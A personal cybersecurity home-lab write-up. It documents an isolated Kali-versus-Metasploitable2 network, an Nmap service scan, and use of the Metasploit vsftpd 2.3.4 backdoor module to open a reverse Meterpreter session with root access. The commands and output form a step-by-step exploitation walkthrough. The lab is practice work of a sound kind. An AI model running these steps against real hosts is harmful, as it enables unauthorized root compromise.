# Cybersecurity Home Lab — Project Documentation

**Author:** Gabriel Kurtz
**Tools used:** VirtualBox 7.2.16, Kali Linux, Metasploitable2, Nmap, Metasploit Framework

## Overview

This project is a small isolated virtual network built to practice core offensive
security skills: network scanning, service enumeration, and exploitation of a
known vulnerability. It simulates a simplified "attacker vs. vulnerable host"
scenario using two virtual machines connected on a private, host-only network.

## Lab Architecture

| VM | Role | OS | IP Address |
|---|---|---|---|
| Kali Linux | Attacker machine | Kali Linux (rolling) | 192.168.83.10 (static) |
| Metasploitable2 | Target machine | Ubuntu-based (intentionally vulnerable) | 192.168.83.3 (DHCP) |

Both VMs were connected via a **VirtualBox Host-only Network**, which isolates
lab traffic from the host machine's real network — nothing here reaches the
public internet or the home network.



## Setup Summary

1. Installed VirtualBox and imported a pre-built Kali Linux VM image.
2. Downloaded and imported Metasploitable2 as the target VM.
3. Created a VirtualBox Host-only Network so both VMs could communicate
   without touching the host's real network.
4. Assigned each VM an IP on that network — Metasploitable2 received one
   automatically via DHCP; Kali was configured with a static IP
   (`192.168.83.10/24`) after troubleshooting a DHCP connectivity issue.
5. Verified connectivity between the two VMs with `ping`.

## Step 1: Verify Connectivity

Confirmed both VMs could reach each other before attempting any scanning.

```
kali@kali:~$ ping 192.168.83.3
64 bytes from 192.168.83.3: icmp_seq=1 ttl=64 time=1.34 ms
...
--- 192.168.83.3 ping statistics ---
33 packets transmitted, 33 received, 0% packet loss
```

![Successful ping confirming connectivity between Kali and Metasploitable2](screenshots/ping-success.png)

## Step 2: Network Reconnaissance (Nmap)

Ran a service/version detection scan against the target to identify open
ports and running services.

```
kali@kali:~$ nmap -sV 192.168.83.3

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
23/tcp   open  telnet      Linux telnetd
25/tcp   open  smtp        Postfix smtpd
53/tcp   open  domain      ISC BIND 9.4.2
80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
111/tcp  open  rpcbind     2 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
512/tcp  open  exec        netkit-rsh rexecd
513/tcp  open  login
514/tcp  open  shell       Netkit rshd
1099/tcp open  java-rmi    GNU Classpath grmiregistry
1524/tcp open  bindshell   Metasploitable root shell
2049/tcp open  nfs         2-4 (RPC #100003)
2121/tcp open  ftp         ProFTPD 1.3.1
3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
5900/tcp open  vnc         VNC (protocol 3.3)
6000/tcp open  X11         (access denied)
6667/tcp open  irc         UnrealIRCd
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1

Nmap done: 1 IP address (1 host up) scanned in 16.65 seconds
```

**Analysis:** the scan revealed 23 open services, several of which are known
to be outdated or intentionally vulnerable — notably `vsftpd 2.3.4` on port 21,
which has a publicly documented backdoor vulnerability (CVE-2011-2523).

![Nmap scan results against Metasploitable2](screenshots/nmap-scan-results.png)

## Step 3: Exploitation (vsftpd 2.3.4 Backdoor)

Identified and exploited the vsftpd backdoor vulnerability using the Metasploit
Framework.

**Module used:** `exploit/unix/ftp/vsftpd_234_backdoor`

```
msf > search vsftpd

Matching Modules
================
#  Name                                       Disclosure Date  Rank       Check  Description
-  ----                                       ----------------  ----       -----  -----------
0  auxiliary/dos/ftp/vsftpd_232               2011-02-03        normal     Yes    VSFTPD 2.3.2 Denial of Service
1  exploit/unix/ftp/vsftpd_234_backdoor       2011-07-03        excellent  Yes    VSFTPD 2.3.4 Backdoor Command Execution

msf > use 1
msf exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.83.3
RHOSTS => 192.168.83.3
msf exploit(unix/ftp/vsftpd_234_backdoor) > set LHOST 192.168.83.10
LHOST => 192.168.83.10
msf exploit(unix/ftp/vsftpd_234_backdoor) > run

[*] Started reverse TCP handler on 192.168.83.10:4444
[*] 192.168.83.3:21 - Running automatic check ("set AutoCheck false" to disable)
[*] 192.168.83.3:21 - FTP banner hints its vulnerable: 220 (vsFTPd 2.3.4)
[+] 192.168.83.3:21 - The target appears to be vulnerable. vsftpd 2.3.4 banner detected; backdoor may be present
[+] 192.168.83.3:21 - Backdoor has been spawned!
[*] Meterpreter session 1 opened (192.168.83.10:4444 -> 192.168.83.3:54895)

meterpreter >
```

**Result:** successfully gained a Meterpreter shell session on the target
machine by exploiting the vsftpd 2.3.4 command-execution backdoor.

![Successful exploit — Meterpreter session opened](screenshots/02-successful-exploit-meterpreter-session.png)

**Verifying access level:**

```
meterpreter > getuid
Server username: root

meterpreter > sysinfo
Computer    : metasploitable.localdomain
OS          : Ubuntu 8.04 (Linux 2.6.24-16-server)
Architecture: i686
BuildTuple  : i486-linux-musl
Meterpreter : x86/linux

meterpreter > shell
Process 5268 created.
Channel 1 created.
whoami
root
id
uid=0(root) gid=0(root)
```

**Result:** confirmed full root-level compromise of the target — no privilege
escalation was necessary, as this backdoor grants root access directly.

![Root access confirmed via whoami/id](screenshots/03-root-access-confirmed.png)

## Skills Demonstrated

- Virtual network design and isolation (VirtualBox host-only networking)
- Linux network configuration and troubleshooting (static IP assignment,
  diagnosing DHCP failures, subnet mismatches)
- Network reconnaissance and service enumeration using Nmap
- Vulnerability identification from service/version banners
- Exploitation using the Metasploit Framework (module selection, payload
  configuration, `RHOSTS`/`LHOST` setup)

## Lessons Learned / Troubleshooting Notes

- Two VMs on different VirtualBox host-only networks (or different subnets)
  cannot communicate even if both show "Host-only Adapter" — the network
  *name* and subnet must match exactly.
- When DHCP fails on a VM, assigning a static IP with `ip addr add` is a
  fast, reliable workaround for a small lab, even if it doesn't persist
  across reboots.
- Some Metasploit exploits require `LHOST` to be set manually when using a
  reverse-connecting payload — without it, the module will fail validation.


